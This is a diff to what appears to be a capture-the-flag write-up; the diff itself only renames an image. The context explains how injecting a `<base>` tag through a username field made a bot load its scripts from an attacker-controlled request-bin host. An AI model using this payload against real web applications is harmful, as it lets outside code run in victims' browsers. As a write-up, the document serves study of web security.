@@ -76,7 +76,7 @@ Other scripts had their nonce injected.
 After searching for some [HTML scriptless injection](https://book.hacktricks.xyz/pentesting-web/dangling-markup-html-scriptless-injection) searching I came across the possibility of setting our own `<base>` tag. Since both scripts were loaded using a relative path, we could serve them on our own web server and by setting the `<base>` tag to out web server have the bot query our scripts when visiting our profile.
 
 We first used a request bin as a proof of concept and registered a new user with our payload `</title><base href="https://enz1qwuixexc.x.pipedream.net/">` and it worked!
-![](/Assets/Pasted%20image%2020220928135615.png)
+![](/Assets/Pasted%20image%2020220928135616.png)
 
 ![](/Assets/Pasted%20image%2020220928144055.png)
 
